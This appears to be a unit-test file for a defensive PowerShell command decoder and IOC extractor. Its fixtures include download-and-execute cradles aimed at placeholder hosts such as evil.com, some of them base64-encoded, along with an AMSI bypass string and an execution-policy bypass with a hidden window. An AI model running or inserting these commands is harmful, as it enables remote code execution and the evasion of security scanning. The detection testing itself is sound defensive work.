"""tests/test_powershell_decoder.py — Unit tests for PowerShell decoder."""
import base64
import pytest
from tools.powershell_decoder import (
    decode_powershell_commands,
    extract_iocs,
    _safe_b64_decode,
)


def _encode_b64(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


class TestBase64Decode:
    def test_utf16_le_decode(self):
        payload = "Write-Host 'Hello World'"
        encoded = _encode_b64(payload)
        result = _safe_b64_decode(encoded)
        assert result == payload

    def test_invalid_base64_returns_none(self):
        result = _safe_b64_decode("!!!!not_valid_base64!!!!")
        assert result is None

    def test_short_blob_skipped(self):
        # Short blobs should not match the pattern anyway
        result = _safe_b64_decode("abc=")
        # May or may not decode — just ensure no exception
        pass


class TestDecodePowerShellCommands:
    def test_detects_encoded_command(self):
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
        encoded = _encode_b64(payload)
        cmdline_data = [{
            "pid": "1234",
            "process": "powershell.exe",
            "cmdline": f"powershell.exe -NonInteractive -EncodedCommand {encoded}",
        }]
        results = decode_powershell_commands(cmdline_data)
        assert len(results) == 1
        finding = results[0]
        assert finding["decoded_content"] is not None
        assert "IEX" in finding["decoded_content"] or "DownloadString" in finding["decoded_content"]
        names = [p["name"] for p in finding["patterns_found"]]
        assert "EncodedCommand" in names

    def test_detects_amsi_bypass(self):
        cmdline_data = [{
            "pid": "5678",
            "process": "powershell.exe",
            "cmdline": "powershell.exe -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\"",
        }]
        results = decode_powershell_commands(cmdline_data)
        assert len(results) == 1

    def test_skips_non_powershell_processes(self):
        cmdline_data = [{
            "pid": "9999",
            "process": "notepad.exe",
            "cmdline": "notepad.exe C:\\test.txt",
        }]
        results = decode_powershell_commands(cmdline_data)
        assert len(results) == 0

    def test_detects_execution_bypass(self):
        cmdline_data = [{
            "pid": "1111",
            "process": "powershell.exe",
            "cmdline": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ...",
        }]
        results = decode_powershell_commands(cmdline_data)
        assert len(results) == 1
        names = [p["name"] for p in results[0]["patterns_found"]]
        assert "ExecutionBypass" in names

    def test_ioc_extraction_from_decoded(self):
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1')"
        encoded = _encode_b64(payload)
        cmdline_data = [{
            "pid": "2222",
            "process": "powershell.exe",
            "cmdline": f"powershell -enc {encoded}",
        }]
        results = decode_powershell_commands(cmdline_data)
        assert len(results) > 0
        iocs = results[0]["iocs"]
        urls = [i["value"] for i in iocs if i["type"] == "url"]
        assert any("malicious-server.com" in u for u in urls)


class TestExtractIOCs:
    def test_extracts_from_decoded_commands(self):
        decoded_commands = [{
            "pid": "1234",
            "process": "powershell.exe",
            "iocs": [
                {"type": "url", "value": "http://c2.example.com/beacon", "recommendation": "block"},
                {"type": "ip",  "value": "198.51.100.42", "recommendation": "lookup"},
            ],
        }]
        result = extract_iocs(decoded_commands)
        values = [r["value"] for r in result]
        assert "http://c2.example.com/beacon" in values
        assert "198.51.100.42" in values

    def test_deduplication(self):
        decoded_commands = [
            {"pid": "1", "process": "ps", "iocs": [{"type": "ip", "value": "203.0.113.1", "recommendation": "x"}]},
            {"pid": "2", "process": "ps", "iocs": [{"type": "ip", "value": "203.0.113.1", "recommendation": "x"}]},
        ]
        result = extract_iocs(decoded_commands)
        ips = [r["value"] for r in result if r["type"] == "ip"]
        assert ips.count("203.0.113.1") == 1
